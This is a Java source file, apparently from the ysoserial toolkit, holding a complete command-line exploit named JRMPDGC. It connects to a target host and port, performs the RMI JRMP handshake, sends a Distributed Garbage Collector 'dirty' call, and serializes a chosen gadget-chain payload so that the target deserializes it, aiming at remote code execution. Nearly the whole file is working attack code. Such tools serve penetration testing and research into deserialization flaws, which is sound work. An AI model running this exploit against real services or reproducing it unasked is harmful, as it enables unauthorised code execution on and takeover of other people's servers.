/**
 * © 2016 AgNO3 Gmbh & Co. KG
 * All right reserved.
 * 
 * Created: 22.01.2016 by mbechler
 */
package ysoserial;


import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.net.URLClassLoader;

import javax.net.SocketFactory;

import sun.rmi.transport.TransportConstants;
import ysoserial.payloads.ObjectPayload;


/**
 * @author mbechler
 *
 */
@SuppressWarnings ( {
    "javadoc", "nls", "restriction", "rawtypes"
} )
public class JRMPDGC {

    public static final void main ( final String[] args ) {

        if ( args.length < 4 ) {
            System.err.println(JRMPDGC.class.getName() + " <host> <port> <payload_type> <payload_arg>");
            System.exit(-1);
        }

        final Class<? extends ObjectPayload> payloadClass = getPayloadClass(args[ 2 ]);
        if ( payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass) ) {
            System.err.println("Invalid payload type '" + args[ 2 ] + "'");
            System.exit(-1);
            return;
        }

        InetSocketAddress isa = new InetSocketAddress(args[ 0 ], Integer.parseInt(args[ 1 ]));
        Socket s = null;
        DataOutputStream dos = null;
        try {
            System.err.println("* Opening JRMP socket " + isa);
            try {
                s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());
                s.setKeepAlive(true);
                s.setTcpNoDelay(true);

                OutputStream os = s.getOutputStream();
                dos = new DataOutputStream(os);

                dos.writeInt(TransportConstants.Magic);
                dos.writeShort(TransportConstants.Version);
                dos.writeByte(TransportConstants.SingleOpProtocol);

                dos.write(TransportConstants.Call);

                final ObjectOutputStream objOut = new ObjectOutputStream(dos) {

                    @Override
                    protected void annotateClass ( Class<?> cl ) throws IOException {
                        if ( ! ( cl.getClassLoader() instanceof URLClassLoader ) ) {
                            writeObject(null);
                        }
                        else {
                            URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();
                            String cb = "";
                            for ( URL u : us ) {
                                cb += u.toString();
                            }
                            writeObject(cb);
                        }
                    }


                    /**
                     * Serializes a location from which to load the specified class.
                     */
                    @Override
                    protected void annotateProxyClass ( Class<?> cl ) throws IOException {
                        annotateClass(cl);
                    }
                };

                objOut.writeLong(2); // DGC
                objOut.writeInt(0);
                objOut.writeLong(0);
                objOut.writeShort(0);

                objOut.writeInt(1); // dirty
                objOut.writeLong(-669196253586618813L);

                final ObjectPayload payload = payloadClass.newInstance();
                final Object object = payload.getObject(args[ 3 ]);
                objOut.writeObject(object);

                os.flush();
            }
            finally {
                if ( dos != null ) {
                    dos.close();
                }
                if ( s != null ) {
                    s.close();
                }
            }
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }

    }


    @SuppressWarnings ( "unchecked" )
    private static Class<? extends ObjectPayload> getPayloadClass ( final String className ) {
        try {
            return (Class<? extends ObjectPayload>) Class.forName(className);
        }
        catch ( Exception e1 ) {}
        try {
            return (Class<? extends ObjectPayload>) Class.forName(GeneratePayload.class.getPackage().getName() + ".payloads." + className);
        }
        catch ( Exception e2 ) {}
        return null;
    }
}
